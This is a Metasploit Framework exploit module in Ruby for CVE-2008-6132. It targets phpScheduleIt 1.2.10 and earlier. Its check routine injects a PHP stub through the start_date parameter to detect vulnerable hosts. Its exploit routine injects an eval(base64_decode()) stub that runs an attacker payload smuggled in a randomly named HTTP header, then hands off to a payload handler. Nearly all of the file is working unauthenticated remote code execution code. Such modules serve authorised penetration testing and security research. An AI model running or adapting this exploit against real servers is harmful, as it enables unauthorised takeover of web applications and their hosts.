##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'phpScheduleIt PHP reserve.php start_date Parameter Arbitrary Code Injection',
			'Description'    => %q{
					This module exploits an arbitrary PHP code execution flaw in the phpScheduleIt
				software. This vulnerability is only exploitable when the magic_quotes_gpc PHP
				option is 'off'. Authentication is not required to exploit the bug.

				Version 1.2.10 and earlier of phpScheduleIt are affected.
			},
			'Author'         =>
				[
					'EgiX',        # Vulnerability Discovery and Exploit
					'juan vazquez' # Metasploit module
				],
			'License'        => BSD_LICENSE,
			'References'     =>
				[
					['CVE', '2008-6132'],
					['OSVDB', '48797'],
					['BID', '31520'],
					['EDB', '6646'],
				],
			'Privileged'     => false,
			'Platform'       => ['php'],
			'Arch'           => ARCH_PHP,
			'Payload'        =>
				{
					# max header length for Apache,
					# http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
					'Space'       => 8190,
					'DisableNops' => true,
					'Keys'        => ['php'],
				},
			'Targets'        => [ ['Automatic', { }] ],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Oct 1 2008'))

		register_options(
			[
				OptString.new('URI', [ true,  "The full URI path to phpScheduleIt", '/phpscheduleit']),
			], self.class)
	end

	def check
		signature = rand_text_alpha(rand(10)+10)
		stub = "1').${print('#{signature}')}.${die};#"
		my_payload = "btnSubmit=1&start_date=#{stub}"

		uri = normalize_uri(datastore['URI'])
		uri << '/' if uri[-1,1] != '/'

		print_status("Checking uri #{uri}")

		response = send_request_cgi({
			'method' => "POST",
			'global' => true,
			'uri' => uri,
			'headers' => {
					'Referer' => uri,
				},
			'data' => "#{my_payload}"
		}, 25)

		if response.code == 200 and response.body =~ /#{signature}/
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		headername = "X-" + Rex::Text.rand_text_alpha_upper(rand(10)+10)
		stub = "1').${error_reporting(0)}.${eval(base64_decode($_SERVER[HTTP_#{headername.gsub("-", "_")}]))};#"
		my_payload = "btnSubmit=1&start_date=#{stub}"

		uri = normalize_uri(datastore['URI'])
		uri << '/' if uri[-1,1] != '/'

		print_status("Sending request for: #{uri}")
		print_status("Payload embedded in header: #{headername}")

		response = send_request_cgi({
			'method' => "POST",
			'global' => true,
			'uri' => uri,
			'headers' => {
					headername  => Rex::Text.encode_base64(payload.encoded),
					'Referer'   => uri
				},
			'data' => "#{my_payload}"
		}, 25)

		if response and response.code != 200
			print_error("Server returned a non-200 status code: (#{response.code})")
		end

		handler
	end
end
